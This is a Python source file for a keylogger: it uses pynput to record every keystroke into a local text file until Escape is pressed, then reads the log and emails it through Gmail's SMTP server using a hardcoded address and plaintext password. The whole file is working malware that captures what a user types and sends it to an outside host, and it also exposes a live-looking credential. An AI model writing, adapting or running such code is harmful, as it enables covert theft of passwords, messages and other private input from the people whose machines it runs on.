import smtplib
import ssl
from pynput import keyboard

sender_mail = "takella6315@gmail.com"
receiver_mail = "takella6315@gmail.com"
password = "tvxlblpmfarglzrv"
message = """From: takella6315@gmail.com
To: takella6315@gmail.com                     
Subject: Logs from Keylogger1
Text: The keylogger has logged this: 
"""
port = 25
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        
def start(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def stop(Key):
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press = start, on_release = stop) as listener:
    listener.join()

print(sender_mail, receiver_mail, port, password)

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    


print(sender_mail, receiver_mail, port, password)
context = ssl.create_default_context()
with smtplib.SMTP('smtp.gmail.com', port) as server:
    print(sender_mail, receiver_mail, port, password)
    server.starttls(context = context)
    server.ehlo()
    server.login(sender_mail, password)
    server.sendmail(sender_mail, receiver_mail, message)
    print("Email Sent to ",sender_mail)
    server.quit()

f.close()
